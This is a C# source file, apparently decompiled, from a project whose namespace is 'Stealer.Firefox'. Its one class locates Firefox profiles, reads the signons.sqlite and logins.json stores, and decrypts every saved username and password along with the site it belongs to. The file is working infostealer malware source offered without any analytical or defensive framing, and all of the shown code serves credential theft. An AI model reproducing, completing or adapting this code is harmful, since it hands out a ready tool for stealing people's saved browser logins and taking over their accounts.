using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using Newtonsoft.Json;

namespace Stealer.Firefox
{
	// Token: 0x0200001F RID: 31
	internal class cPasswords
	{
		// Token: 0x06000095 RID: 149 RVA: 0x000065FC File Offset: 0x000047FC
		public static List<Password> Get(string mozilapath)
		{
			string text = null;
			string text2 = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(mozilapath, "Profiles"));
			List<Password> list = new List<Password>();
			bool flag3 = directories.Length == 0;
			List<Password> list2;
			if (flag3)
			{
				list2 = list;
			}
			else
			{
				foreach (string text3 in directories)
				{
					string[] array2 = Directory.GetFiles(text3, "signons.sqlite");
					bool flag4 = array2.Length != 0;
					if (flag4)
					{
						text = array2[0];
						flag = true;
					}
					array2 = Directory.GetFiles(text3, "logins.json");
					bool flag5 = array2.Length != 0;
					if (flag5)
					{
						text2 = array2[0];
						flag2 = true;
					}
					bool flag6 = flag2 || flag;
					if (flag6)
					{
						FFDecryptor.NSS_Init(text3);
						break;
					}
				}
				bool flag7 = flag;
				if (flag7)
				{
					using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + text + ";"))
					{
						sqliteConnection.Open();
						using (SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand())
						{
							sqliteCommand.CommandText = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
							using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
							{
								while (sqliteDataReader.Read())
								{
									string text4 = FFDecryptor.Decrypt(sqliteDataReader.GetString(0));
									string text5 = FFDecryptor.Decrypt(sqliteDataReader.GetString(1));
									list.Add(new Password
									{
										sUsername = text4,
										sPassword = text5,
										sUrl = sqliteDataReader.GetString(2)
									});
								}
							}
						}
						sqliteConnection.Close();
					}
				}
				bool flag8 = flag2;
				if (flag8)
				{
					cPasswords.FFLogins fflogins;
					using (StreamReader streamReader = new StreamReader(text2))
					{
						string text6 = streamReader.ReadToEnd();
						fflogins = JsonConvert.DeserializeObject<cPasswords.FFLogins>(text6);
					}
					foreach (cPasswords.LoginData loginData in fflogins.logins)
					{
						string text7 = FFDecryptor.Decrypt(loginData.encryptedUsername);
						string text8 = FFDecryptor.Decrypt(loginData.encryptedPassword);
						list.Add(new Password
						{
							sUsername = text7,
							sPassword = text8,
							sUrl = loginData.hostname
						});
					}
				}
				list2 = list;
			}
			return list2;
		}

		// Token: 0x02000206 RID: 518
		private class FFLogins
		{
			// Token: 0x170003AB RID: 939
			// (get) Token: 0x0600168D RID: 5773 RVA: 0x0006545C File Offset: 0x0006365C
			// (set) Token: 0x0600168E RID: 5774 RVA: 0x00065464 File Offset: 0x00063664
			public long nextId { get; set; }

			// Token: 0x170003AC RID: 940
			// (get) Token: 0x0600168F RID: 5775 RVA: 0x00065470 File Offset: 0x00063670
			// (set) Token: 0x06001690 RID: 5776 RVA: 0x00065478 File Offset: 0x00063678
			public cPasswords.LoginData[] logins { get; set; }

			// Token: 0x170003AD RID: 941
			// (get) Token: 0x06001691 RID: 5777 RVA: 0x00065484 File Offset: 0x00063684
			// (set) Token: 0x06001692 RID: 5778 RVA: 0x0006548C File Offset: 0x0006368C
			public string[] disabledHosts { get; set; }

			// Token: 0x170003AE RID: 942
			// (get) Token: 0x06001693 RID: 5779 RVA: 0x00065498 File Offset: 0x00063698
			// (set) Token: 0x06001694 RID: 5780 RVA: 0x000654A0 File Offset: 0x000636A0
			public int version { get; set; }
		}

		// Token: 0x02000207 RID: 519
		private class LoginData
		{
			// Token: 0x170003AF RID: 943
			// (get) Token: 0x06001696 RID: 5782 RVA: 0x000654B8 File Offset: 0x000636B8
			// (set) Token: 0x06001697 RID: 5783 RVA: 0x000654C0 File Offset: 0x000636C0
			public long id { get; set; }

			// Token: 0x170003B0 RID: 944
			// (get) Token: 0x06001698 RID: 5784 RVA: 0x000654CC File Offset: 0x000636CC
			// (set) Token: 0x06001699 RID: 5785 RVA: 0x000654D4 File Offset: 0x000636D4
			public string hostname { get; set; }

			// Token: 0x170003B1 RID: 945
			// (get) Token: 0x0600169A RID: 5786 RVA: 0x000654E0 File Offset: 0x000636E0
			// (set) Token: 0x0600169B RID: 5787 RVA: 0x000654E8 File Offset: 0x000636E8
			public string url { get; set; }

			// Token: 0x170003B2 RID: 946
			// (get) Token: 0x0600169C RID: 5788 RVA: 0x000654F4 File Offset: 0x000636F4
			// (set) Token: 0x0600169D RID: 5789 RVA: 0x000654FC File Offset: 0x000636FC
			public string httprealm { get; set; }

			// Token: 0x170003B3 RID: 947
			// (get) Token: 0x0600169E RID: 5790 RVA: 0x00065508 File Offset: 0x00063708
			// (set) Token: 0x0600169F RID: 5791 RVA: 0x00065510 File Offset: 0x00063710
			public string formSubmitURL { get; set; }

			// Token: 0x170003B4 RID: 948
			// (get) Token: 0x060016A0 RID: 5792 RVA: 0x0006551C File Offset: 0x0006371C
			// (set) Token: 0x060016A1 RID: 5793 RVA: 0x00065524 File Offset: 0x00063724
			public string usernameField { get; set; }

			// Token: 0x170003B5 RID: 949
			// (get) Token: 0x060016A2 RID: 5794 RVA: 0x00065530 File Offset: 0x00063730
			// (set) Token: 0x060016A3 RID: 5795 RVA: 0x00065538 File Offset: 0x00063738
			public string passwordField { get; set; }

			// Token: 0x170003B6 RID: 950
			// (get) Token: 0x060016A4 RID: 5796 RVA: 0x00065544 File Offset: 0x00063744
			// (set) Token: 0x060016A5 RID: 5797 RVA: 0x0006554C File Offset: 0x0006374C
			public string encryptedUsername { get; set; }

			// Token: 0x170003B7 RID: 951
			// (get) Token: 0x060016A6 RID: 5798 RVA: 0x00065558 File Offset: 0x00063758
			// (set) Token: 0x060016A7 RID: 5799 RVA: 0x00065560 File Offset: 0x00063760
			public string encryptedPassword { get; set; }

			// Token: 0x170003B8 RID: 952
			// (get) Token: 0x060016A8 RID: 5800 RVA: 0x0006556C File Offset: 0x0006376C
			// (set) Token: 0x060016A9 RID: 5801 RVA: 0x00065574 File Offset: 0x00063774
			public string guid { get; set; }

			// Token: 0x170003B9 RID: 953
			// (get) Token: 0x060016AA RID: 5802 RVA: 0x00065580 File Offset: 0x00063780
			// (set) Token: 0x060016AB RID: 5803 RVA: 0x00065588 File Offset: 0x00063788
			public int encType { get; set; }

			// Token: 0x170003BA RID: 954
			// (get) Token: 0x060016AC RID: 5804 RVA: 0x00065594 File Offset: 0x00063794
			// (set) Token: 0x060016AD RID: 5805 RVA: 0x0006559C File Offset: 0x0006379C
			public long timeCreated { get; set; }

			// Token: 0x170003BB RID: 955
			// (get) Token: 0x060016AE RID: 5806 RVA: 0x000655A8 File Offset: 0x000637A8
			// (set) Token: 0x060016AF RID: 5807 RVA: 0x000655B0 File Offset: 0x000637B0
			public long timeLastUsed { get; set; }

			// Token: 0x170003BC RID: 956
			// (get) Token: 0x060016B0 RID: 5808 RVA: 0x000655BC File Offset: 0x000637BC
			// (set) Token: 0x060016B1 RID: 5809 RVA: 0x000655C4 File Offset: 0x000637C4
			public long timePasswordChanged { get; set; }

			// Token: 0x170003BD RID: 957
			// (get) Token: 0x060016B2 RID: 5810 RVA: 0x000655D0 File Offset: 0x000637D0
			// (set) Token: 0x060016B3 RID: 5811 RVA: 0x000655D8 File Offset: 0x000637D8
			public long timesUsed { get; set; }
		}
	}
}
